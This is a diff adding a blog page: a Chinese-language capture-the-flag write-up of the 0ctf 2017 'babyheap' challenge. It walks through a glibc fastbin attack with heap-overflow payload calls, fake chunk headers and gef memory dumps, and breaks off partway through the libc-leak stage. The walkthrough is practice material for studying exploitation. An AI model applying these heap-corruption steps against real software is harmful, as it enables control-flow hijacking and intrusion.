@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/./favicon.ico?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/./favicon.ico?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: 'W9VSQ0GGKQ',
+      apiKey: '74aef4d13e544170be082d500082ddb0',
+      indexName: 'yuuoniy',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="0ctf 2017 babyheap writeup有关 fastbin attack 利用">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF | 0ctf 2017 babyheap">
+<meta property="og:url" content="https://yuuoniy.github.io/2018/09/25/ctf-fastbin-attack/index.html">
+<meta property="og:site_name" content="喵">
+<meta property="og:description" content="0ctf 2017 babyheap writeup有关 fastbin attack 利用">
+<meta property="og:updated_time" content="2019-10-14T17:25:42.151Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF | 0ctf 2017 babyheap">
+<meta name="twitter:description" content="0ctf 2017 babyheap writeup有关 fastbin attack 利用">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yuuoniy.github.io/2018/09/25/ctf-fastbin-attack/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>CTF | 0ctf 2017 babyheap | 喵</title>
+  
+
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?0aff8f2cdbe4bb92b5d83006432c115a";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">喵</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">没错就是尿尿啦</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yuuoniy.github.io/2018/09/25/ctf-fastbin-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yuuoniy">
+      <meta itemprop="description" content="世界本该是你醒来的模样">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="喵">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF | 0ctf 2017 babyheap
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-09-25 10:42:41" itemprop="dateCreated datePublished" datetime="2018-09-25T10:42:41+08:00">2018-09-25</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-10-15 01:25:42" itemprop="dateModified" datetime="2019-10-15T01:25:42+08:00">2019-10-15</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/09/25/ctf-fastbin-attack/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/09/25/ctf-fastbin-attack/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/09/25/ctf-fastbin-attack/" class="leancloud_visitors" data-flag-title="CTF | 0ctf 2017 babyheap">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Symbols count in article: </span>
+                
+                <span title="Symbols count in article">14k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">13 mins.</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><code>0ctf 2017 babyheap writeup</code><br>有关 <code>fastbin attack</code> 利用<br><a id="more"></a></p>
+<p>稍微复习一下 <code>fastbin attack</code><br>利用思路：</p>
+<ol>
+<li>覆盖 <code>got</code> 表劫持控制流</li>
+<li>覆盖栈上函数返回地址，然后ROP劫持控制流</li>
+<li>覆盖 <code>malloc_hook</code>、覆盖 <code>_IO_FILE</code> 等方式劫持控制流<br>没有开 FULL RELRO 的话，就可以考虑修改 got 表内容</li>
+</ol>
+<p>算是很经典的一道题了吧<br>先分析一下程序<br><strong>allocate</strong>:<br>最大0x1000</p>
+<p><strong>fill</strong>   关键！<br>没有设置字符串结尾，而且长度并不是之前 chunk 分配时指定的长度，是自己指定的，所以这里就出现了任意堆溢出的情形。可以用来泄露libc地址，以及构造fake chunk</p>
+<p><strong>dump</strong><br>输出对应chunk的内容</p>
+<p><strong>free</strong><br>释放堆块，清空 <code>inuse,size,ptr</code></p>
+<p>chunk 结构:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">+---------|---------+</div><div class="line">|prev_size|  size   |</div><div class="line">|---------|---------|</div><div class="line">|   fd    |   bk    |</div><div class="line">|---------|---------|</div><div class="line">|       data        |</div><div class="line">+---------|---------+</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chunk 包含三个字段：</div><div class="line">inuse</div><div class="line">size</div><div class="line">ptr</div></pre></td></tr></table></figure>
+<p>题目中 <code>fill</code> 存在堆溢出，可以写任意长度，注意分配使用的 <code>calloc</code> ，在分配的时候会将分配出来的 <code>chunk</code> <code>先清空，dump</code> 的大小是根据 <code>alloc</code> 指定的 <code>size</code> 决定的，跟真正的 <code>chunk</code> 大小无关。</p>
+<p>检查保护<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] &apos;/home/yuuoniy/Desktop/201809/babyheap&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Full RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div></pre></td></tr></table></figure></p>
+<p>不能直接修改 <code>got</code>。。所以思路应该是 修改 <code>malloc__hook</code> 或 <code>__free__hook</code></p>
+<p><strong>利用思路</strong><br>关键</p>
+<ol>
+<li>泄露 <code>libc</code> 地址：从而得到 <code>malloc_hook</code> ,<code>one_gadget</code> 的地址</li>
+<li>劫持控制流：通过修改<code>malloc_hook</code> 到 <code>one_gadget</code> 地址，就可以劫持控制流，因此可以通过 <code>fastbin attack</code> ，达到任意地址写</li>
+</ol>
+<p>利用堆溢出我们可以修改 <code>size</code>，从而达到 <code>chunk overlapping,</code>再通过 <code>dump</code> 就可以获取堆块的<code>fd,bk</code> 从而得到 <code>libc</code> 地址</p>
+<p>可以看一下 <code>glibc</code> 中 <code>__libc_free</code> 的实现<br>注意 <code>free</code> 的时候会检查 <code>nextsize</code> 是否合法,所以我们需要伪造 <code>nextsize</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</div><div class="line">   malloc_printerr (<span class="string">"double free or corruption (!prev)"</span>);</div><div class="line"> nextsize = chunksize(nextchunk);</div><div class="line"> <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</div><div class="line">     || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</div><div class="line">   malloc_printerr (<span class="string">"free(): invalid next size (normal)"</span>);</div></pre></td></tr></table></figure></p>
+<p>构造 <code>chunk</code> 的 <code>layout</code> 还是有点难…参考了一下别人的思路， 劫持控制流的操作比较常规<br>如果分配出来的 chunk 的 size 不属于这个 fastbin，那么会出现memory corruption(fast) 的错误。通过修改 fd 进入 fastbin 的 chunk 并没有进行对齐检测，所以我们可以利用没有对齐的数据来通过这个检测</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">victim = *fb;</div><div class="line">     <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</div><div class="line">       &#123;</div><div class="line">         <span class="keyword">if</span> (SINGLE_THREAD_P)</div><div class="line">           *fb = victim-&gt;fd;</div><div class="line">         <span class="keyword">else</span></div><div class="line">           REMOVE_FB (fb, pp, victim);</div><div class="line">         <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</div><div class="line">           &#123;</div><div class="line">             <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</div><div class="line">             <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</div><div class="line">               malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</div></pre></td></tr></table></figure>
+<h3 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h3><p>首先<code>alloc(0x60)</code> <code>alloc(0x40)</code> 分配两个堆块 分别标记为 0 1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">32</span>gx <span class="number">0x0000555c81913000</span></div><div class="line"><span class="number">0x555c81913000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> &lt;= chunk <span class="number">0</span> header </div><div class="line"><span class="number">0x555c81913010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c81913020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c81913030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c81913040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c81913050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c81913060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> &lt;= chunk <span class="number">1</span> header</div><div class="line"><span class="number">0x555c81913070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></div><div class="line"><span class="number">0x555c81913080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c81913090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c819130a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c819130b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c819130c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f41</span> &lt;= top chunk</div><div class="line"><span class="number">0x555c819130d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c819130e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x555c819130f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure></p>
+<p><code>fill(0, 0x60 + 0x10, &#39;a&#39; * 0x60 + p64(0) + p64(0x71))</code><br> 通过栈溢出修改 <code>chunk 1</code> 的 <code>size</code> 为 <code>0x70</code><br> <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"> gef➤  x/<span class="number">32</span>gx <span class="number">0x000055ca12def000</span></div><div class="line"><span class="number">0x55ca12def000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt;chunk <span class="number">0</span> header</div><div class="line"><span class="number">0x55ca12def010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55ca12def020</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55ca12def030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55ca12def040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55ca12def050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55ca12def060</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55ca12def070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt;chunk <span class="number">1</span> size 被修改为<span class="number">0x70</span>了</div><div class="line"><span class="number">0x55ca12def080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55ca12def090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55ca12def0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55ca12def0b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55ca12def0c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f41</span></div><div class="line"><span class="number">0x55ca12def0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure></p>
+<p><code>alloc(0x100) # 2</code>: </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">32</span>gx <span class="number">0x000055dc9b1b8000</span></div><div class="line"><span class="number">0x55dc9b1b8000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">0</span> header</div><div class="line"><span class="number">0x55dc9b1b8010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8020</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8060</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">1</span> header (注意原本的size是<span class="number">0x51</span>)</div><div class="line"><span class="number">0x55dc9b1b8080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b8090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b80a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b80b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b80c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> =&gt; chunk <span class="number">2</span>  header</div><div class="line"><span class="number">0x55dc9b1b80d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b80e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b80f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure>
+<p><code>fill(2, 0x20, &#39;c&#39; * 0x10 + p64(0) + p64(0x71))</code><br>在 chunk2 中构造一个 fake chunk header</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">32</span>gx <span class="number">0x000055dc9b1b8000</span></div><div class="line"><span class="number">0x55dc9b1b8000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">0</span></div><div class="line"><span class="number">0x55dc9b1b8010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8020</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8060</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x55dc9b1b8070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">1</span> </div><div class="line"><span class="number">0x55dc9b1b8080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b8090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b80a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b80b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x55dc9b1b80c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> =&gt; chunk <span class="number">2</span></div><div class="line"><span class="number">0x55dc9b1b80d0</span>:	<span class="number">0x6363636363636363</span>	<span class="number">0x6363636363636363</span></div><div class="line"><span class="number">0x55dc9b1b80e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; fake chunk size</div><div class="line"><span class="number">0x55dc9b1b80f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure>
+<p><code>free(1)</code>,添加 chunk 1添加到 <code>fastbin</code> 中，注意 size 是 <code>0x70</code>,包括了 <code>chunk 2</code> 的一部分<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Fastbins[idx=<span class="number">5</span>, size=<span class="number">0x60</span>]  ←  Chunk(addr=<span class="number">0x55d152149080</span>, size=<span class="number">0x70</span>, flags=PREV_INUSE)</div></pre></td></tr></table></figure></p>
+<p>将 刚 free 掉的chunk 1 malloc 出来,里面的内容被清空了<br>alloc(0x60)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">16</span>gx <span class="number">0x00005565fc9ce000</span></div><div class="line"><span class="number">0x5565fc9ce000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">0</span></div><div class="line"><span class="number">0x5565fc9ce010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5565fc9ce020</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5565fc9ce030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5565fc9ce040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5565fc9ce050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5565fc9ce060</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x5565fc9ce070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">1</span></div><div class="line">gef➤  </div><div class="line"><span class="number">0x5565fc9ce080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x5565fc9ce090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x5565fc9ce0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x5565fc9ce0b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x5565fc9ce0c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x5565fc9ce0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div><div class="line"><span class="number">0x5565fc9ce0e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">2</span> fake header </div><div class="line"><span class="number">0x5565fc9ce0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></div></pre></td></tr></table></figure>
+<p><code>fill(1, 0x40 + 0x10, &#39;b&#39; * 0x40 + p64(0) + p64(0x111))</code> ：<br>恢复 chunk2 的头<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">gef➤  x/<span class="number">32</span>gx <span class="number">0x565289992010</span><span class="number">-0x10</span></div><div class="line"><span class="number">0x565289992000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> =&gt; chunk <span class="number">0</span></div><div class="line"><span class="number">0x565289992010</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></div><div class="line"><span class="number">0x565289992020</span>:	